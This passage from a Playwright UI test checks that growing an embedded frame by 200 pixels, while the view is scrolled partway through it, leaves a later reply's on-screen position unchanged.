  );
  const reading = log(page).locator(".reply").getByText("Further words.");
  await expect(reading).toBeVisible();

  // Read further down: the visual starts 40 px above the view, far from
  // the end. (A frame wholly out of view isn't drawn, so it reports no
  // change until it shows.)
  await card.evaluate((element) => {
    let scroller = element.parentElement;
    while (scroller && getComputedStyle(scroller).overflowY !== "auto") {
      scroller = scroller.parentElement;
    }
    if (!scroller) throw new Error("No scrolling area.");
    scroller.scrollTop +=
      element.getBoundingClientRect().top -
      scroller.getBoundingClientRect().top +
      40;
  });
  const at = () =>
    reading.evaluate((element) =>
      Math.round(element.getBoundingClientRect().top),
    );
  const before = await at();
  // The visual grows by 200 px.
  await (
    await frameOf(card)
  ).evaluate(() => {
    const more = document.createElement("div");
    more.style.height = "200px";
    document.body.append(more);
  });
  await expect
    .poll(() =>
      card.evaluate((element) => element.getBoundingClientRect().height),
    )
    .toBe(320);
  expect(await at()).toBe(before);
});
